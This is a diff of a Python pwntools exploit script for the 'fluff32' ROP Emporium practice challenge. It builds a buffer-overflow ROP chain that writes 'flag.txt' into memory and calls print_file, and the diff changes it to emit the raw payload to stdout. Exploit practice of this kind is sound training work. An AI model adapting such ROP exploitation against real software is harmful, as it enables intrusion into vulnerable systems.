@@ -1,9 +1,8 @@
 from pwn import *
-elf = context.binary = ELF("./fluff32")
-io = process("./fluff32")
-#context.log_level = "debug"
+import sys
 
 data_addr = 0x0804a018
+print_file_addr = 0x080483d0
 
 # populate edx
 gadget_write_0 = 0x080485bb    # pop ebp ; ret
@@ -35,6 +34,11 @@ def find_mask(x):
     mask = 0
     for bit in mask_bits:
            mask = (mask << 1) | bit
+    print("====================")
+    print(bin(ebx)[2:].zfill(32))
+    print(bin(mask)[2:].zfill(32))
+    print(x)
+    print("====================")
     return p32(mask)
 
 def write_in_data(data):
@@ -55,12 +59,9 @@ def write_in_data(data):
 
 payload = b"A" * 44
 payload += write_in_data(b"flag.txt")  # write "flag.txt" en .data
-payload += p32(elf.plt['print_file'])  # print_file("flag.txt")
+payload += p32(print_file_addr)        # print_file("flag.txt")
 payload += p32(0)                      # ebp
 payload += p32(data_addr)              # "flag.txt"
 
-io.recv()
-io.sendline(payload)
-io.interactive()
-
+sys.stdout.buffer.write(payload)
 
